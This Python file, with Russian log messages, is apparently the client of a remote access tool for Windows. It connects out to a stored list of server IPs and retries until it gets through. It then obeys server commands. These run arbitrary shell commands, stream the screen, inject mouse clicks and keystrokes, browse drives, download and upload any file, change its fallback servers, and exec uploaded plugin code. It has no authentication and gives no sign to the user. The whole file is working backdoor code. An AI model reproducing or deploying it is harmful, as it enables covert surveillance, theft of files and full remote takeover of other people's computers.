import os
import sys
import socket
import struct
import time
import subprocess
import threading
import queue
import ctypes
import string
import cv2
import numpy as np
import mss

CONFIG_FILE = "server_ips.txt"
DEFAULT_SERVER_IP = "192.168.0.112"
PORT = 5000

current_dir = None
loaded_plugins = {}


def load_ips():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                lines = [line.strip() for line in f if line.strip()]
                if lines:
                    return lines
        except Exception:
            pass
    save_ips([DEFAULT_SERVER_IP])
    return [DEFAULT_SERVER_IP]


def save_ips(ips):
    try:
        with open(CONFIG_FILE, "w") as f:
            f.write("\n".join(ips) + "\n")
    except Exception:
        pass


def load_plugins():
    global loaded_plugins
    loaded_plugins.clear()
    plugins_dir = "plugins"
    if not os.path.exists(plugins_dir):
        os.makedirs(plugins_dir)
        return

    for filename in os.listdir(plugins_dir):
        if filename.endswith(".plug"):
            filepath = os.path.join(plugins_dir, filename)
            try:
                with open(filepath, "r", encoding="utf-8") as f:
                    code_content = f.read()
                
                namespace = {}
                exec(code_content, namespace)
                
                if "get_commands" in namespace:
                    cmds = namespace["get_commands"]()
                    loaded_plugins.update(cmds)
                    print(f"[+] Загружен плагин из файла: {filename} (команды: {list(cmds.keys())})")
                else:
                    print(f"[-] В файле {filename} не найдена функция get_commands()")
            except Exception as e:
                print(f"[-] Ошибка загрузки плагина {filename}: {e}")


def send_payload(sock, status: int, payload: bytes):
    header = struct.pack("!BQ", status, len(payload))
    sock.sendall(header + payload)


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        except Exception:
            return None
    return data


def receive_payload(sock):
    try:
        header = recv_exact(sock, 9)
        if not header:
            return False, b"Connection closed"
        status_byte = header[0]
        length = struct.unpack("!Q", header[1:9])[0]
        if length > 500 * 1024 * 1024:
            return False, b"Payload desync error"
        payload = recv_exact(sock, length)
        if payload is None:
            return False, b"Connection closed"
        return (status_byte == 1), payload
    except Exception as e:
        return False, str(e).encode("utf-8")


def get_windows_drives():
    drives = [f"[Drive] {d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    return "\n".join(drives) if drives else "No drives found."


def execute_control_command(cmd_str, screen_w, screen_h):
    try:
        if cmd_str.startswith("CLICK:"):
            _, btn, rx, ry = cmd_str.split(":")
            x = int(float(rx) * screen_w)
            y = int(float(ry) * screen_h)
            ctypes.windll.user32.SetCursorPos(x, y)
            if btn == "left":
                ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)
                ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)
            elif btn == "right":
                ctypes.windll.user32.mouse_event(8, 0, 0, 0, 0)
                ctypes.windll.user32.mouse_event(16, 0, 0, 0, 0)
        elif cmd_str.startswith("MOVE:"):
            _, rx, ry = cmd_str.split(":")
            x = int(float(rx) * screen_w)
            y = int(float(ry) * screen_h)
            ctypes.windll.user32.SetCursorPos(x, y)
        elif cmd_str.startswith("KEY:"):
            _, key_name = cmd_str.split(":")
            if key_name == "enter":
                vk = 0x0D
            elif key_name == "backspace":
                vk = 0x08
            elif key_name == "space":
                vk = 0x20
            else:
                vk = ord(key_name.upper()) if len(key_name) == 1 else 0
            if vk:
                ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
    except Exception:
        pass


def handle_stream(sock, fps, quality, interactive):
    sock.setblocking(False)  
    fps = max(1, min(60, fps))
    quality = max(10, min(100, quality))
    
    frame_queue = queue.Queue(maxsize=1)
    stop_event = threading.Event()

    def capture_thread():
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while not stop_event.is_set():
                start_t = time.time()
                try:
                    sct_img = sct.grab(monitor)
                    frame = np.array(sct_img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    _, encoded_jpg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
                    jpg_bytes = encoded_jpg.tobytes()

                    if frame_queue.full():
                        try:
                            frame_queue.get_nowait()
                        except queue.Empty:
                            pass
                    frame_queue.put(jpg_bytes)
                except Exception:
                    break
                
                elapsed = time.time() - start_t
                sleep_time = (1.0 / fps) - elapsed
                if sleep_time > 0:
                    time.sleep(sleep_time)

    t_cap = threading.Thread(target=capture_thread, daemon=True)
    t_cap.start()

    with mss.mss() as sct:
        monitor = sct.monitors[1]
        screen_w = monitor["width"]
        screen_h = monitor["height"]

    buffer = b""

    try:
        while not stop_event.is_set():
            try:
                jpg_bytes = frame_queue.get(timeout=0.03)
                send_payload(sock, 1, jpg_bytes)
            except queue.Empty:
                pass
            except Exception:
                break

            try:
                data = sock.recv(1024)
                if data:
                    buffer += data
                    while b"\n" in buffer:
                        line, buffer = buffer.split(b"\n", 1)
                        cmd_str = line.decode("utf-8", errors="ignore").strip()
                        if cmd_str == "STOP_STREAM":
                            stop_event.set()
                            break
                        if interactive:
                            execute_control_command(cmd_str, screen_w, screen_h)
            except BlockingIOError:
                pass
            except Exception:
                break
    finally:
        stop_event.set()
        t_cap.join(timeout=1.0)
        sock.setblocking(True)


def main():
    global current_dir
    load_plugins()

    while True:
        ips = load_ips()
        sock = None

        for ip in ips:
            try:
                print(f"[*] Попытка подключения к серверу {ip}:{PORT}...")
                temp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                temp_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                temp_sock.settimeout(3.0)
                temp_sock.connect((ip, PORT))
                temp_sock.settimeout(None)
                sock = temp_sock
                print(f"[+] Успешно подключено к серверу {ip}")
                break
            except Exception:
                if temp_sock:
                    try:
                        temp_sock.close()
                    except Exception:
                        pass
                continue

        if not sock:
            print("[-] Не удалось подключиться ни к одному IP. Повтор через 5 секунд...")
            time.sleep(5)
            continue

        try:
            hostname = socket.gethostname()
            sock.sendall(hostname.encode("utf-8") + b"\n")
        except Exception:
            sock.close()
            continue

        try:
            while True:
                data = sock.recv(1024)
                if not data:
                    break

                command = data.decode("utf-8", errors="ignore").strip()
                if not command:
                    continue

                parts = command.split(" ", 1)
                action = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""

                if action in loaded_plugins:
                    try:
                        loaded_plugins[action](sock, arg)
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))
                    continue

                if action == "plugin_list":
                    try:
                        plugins_dir = "plugins"
                        if not os.path.exists(plugins_dir):
                            os.makedirs(plugins_dir)
                        files = [f for f in os.listdir(plugins_dir) if f.endswith(".plug")]
                        res = "\n".join(files)
                        send_payload(sock, 1, res.encode("utf-8"))
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))

                elif action == "plugin_reload":
                    load_plugins()
                    send_payload(sock, 1, f"Plugins reloaded. Active: {list(loaded_plugins.keys())}".encode("utf-8"))

                elif action == "ip_list":
                    current_ips = load_ips()
                    res = "\n".join([f"{i+1}. {ip}" for i, ip in enumerate(current_ips)])
                    send_payload(sock, 1, res.encode("utf-8"))

                elif action == "ip_add":
                    new_ip = arg.strip()
                    if new_ip:
                        current_ips = load_ips()
                        if new_ip not in current_ips:
                            current_ips.append(new_ip)
                            save_ips(current_ips)
                            send_payload(sock, 1, f"IP {new_ip} успешно добавлен.".encode("utf-8"))
                        else:
                            send_payload(sock, 1, b"IP already exists in list.")
                    else:
                        send_payload(sock, 0, b"Empty IP provided.")

                elif action == "ip_remove":
                    target = arg.strip()
                    current_ips = load_ips()
                    removed = False
                    msg = ""
                    if target.isdigit():
                        idx = int(target) - 1
                        if 0 <= idx < len(current_ips):
                            removed_ip = current_ips.pop(idx)
                            save_ips(current_ips)
                            removed = True
                            msg = f"IP {removed_ip} удален."
                        else:
                            msg = "Invalid index."
                    else:
                        if target in current_ips:
                            current_ips.remove(target)
                            save_ips(current_ips)
                            removed = True
                            msg = f"IP {target} удален."
                        else:
                            msg = "IP not found in list."
                    send_payload(sock, 1 if removed else 0, msg.encode("utf-8"))

                elif action in ["stream", "stream_control"]:
                    interactive = (action == "stream_control")
                    opts = arg.split()
                    fps = int(opts[0]) if len(opts) > 0 and opts[0].isdigit() else 15
                    quality = int(opts[1]) if len(opts) > 1 and opts[1].isdigit() else 40
                    handle_stream(sock, fps, quality, interactive)

                elif action == "shot":
                    try:
                        with mss.mss() as sct:
                            sct_img = sct.grab(sct.monitors[1])
                            frame = np.array(sct_img)
                            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                            _, encoded_jpg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 75])
                            send_payload(sock, 1, encoded_jpg.tobytes())
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))

                elif action == "ls":
                    try:
                        if current_dir is None:
                            result = get_windows_drives()
                            send_payload(sock, 1, result.encode("utf-8"))
                        else:
                            if os.path.exists(current_dir):
                                files = os.listdir(current_dir)
                                result = f"[{current_dir}]\n" + "\n".join(files)
                                send_payload(sock, 1, result.encode("utf-8") if files else f"[{current_dir}] \nDirectory is empty.")
                            else:
                                current_dir = None
                                send_payload(sock, 1, get_windows_drives().encode("utf-8"))
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))

                elif action == "cd":
                    try:
                        if not arg:
                            msg = f"Current path: {current_dir if current_dir else 'Drive root selection'}"
                            send_payload(sock, 1, msg.encode("utf-8"))
                        elif current_dir is None:
                            target = arg.strip().upper()
                            if not target.endswith("\\"):
                                target += "\\"
                            if os.path.exists(target):
                                current_dir = target
                                send_payload(sock, 1, f"Entered drive {current_dir}".encode("utf-8"))
                            else:
                                send_payload(sock, 0, b"Drive not found.")
                        else:
                            if arg == "..":
                                parent = os.path.dirname(current_dir.rstrip("\\"))
                                if not parent or parent + "\\" == current_dir:
                                    current_dir = None
                                    send_payload(sock, 1, b"Returned to drives list.")
                                else:
                                    current_dir = parent + "\\"
                                    send_payload(sock, 1, f"Moved to {current_dir}".encode("utf-8"))
                            else:
                                new_path = os.path.normpath(os.path.join(current_dir, arg))
                                if os.path.isdir(new_path):
                                    current_dir = new_path if new_path.endswith("\\") else new_path + "\\"
                                    send_payload(sock, 1, f"Moved to {current_dir}".encode("utf-8"))
                                else:
                                    send_payload(sock, 0, b"Directory not found.")
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))

                elif action == "cmd":
                    try:
                        output = subprocess.check_output(arg, shell=True, stderr=subprocess.STDOUT)
                        send_payload(sock, 1, output if output else b"Command executed successfully.")
                    except subprocess.CalledProcessError as e:
                        send_payload(sock, 0, e.output if e.output else str(e).encode("utf-8"))

                elif action == "download":
                    try:
                        target_path = os.path.join(current_dir, arg) if current_dir else arg
                        if os.path.exists(target_path) and os.path.isfile(target_path):
                            with open(target_path, "rb") as f:
                                file_data = f.read()
                            send_payload(sock, 1, file_data)
                        else:
                            send_payload(sock, 0, b"File not found.")
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))

                elif action == "upload":
                    try:
                        target_path = os.path.join(current_dir, os.path.basename(arg)) if current_dir else arg
                        
                        # Исправление: принимаем полезную нагрузку через стандартный receive_payload
                        success, file_bytes = receive_payload(sock)
                        if success:
                            # Убедимся, что папка назначения (например, plugins/) существует
                            parent_dir = os.path.dirname(target_path)
                            if parent_dir and not os.path.exists(parent_dir):
                                os.makedirs(parent_dir)

                            with open(target_path, "wb") as f:
                                f.write(file_bytes)
                            send_payload(sock, 1, f"File uploaded successfully to {target_path}".encode("utf-8"))
                        else:
                            send_payload(sock, 0, b"Failed to receive file payload.")
                    except Exception as e:
                        send_payload(sock, 0, str(e).encode("utf-8"))

        except (socket.error, ConnectionResetError):
            print("[-] Соединение потеряно. Повторная попытка через 5 секунд...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Ошибка: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()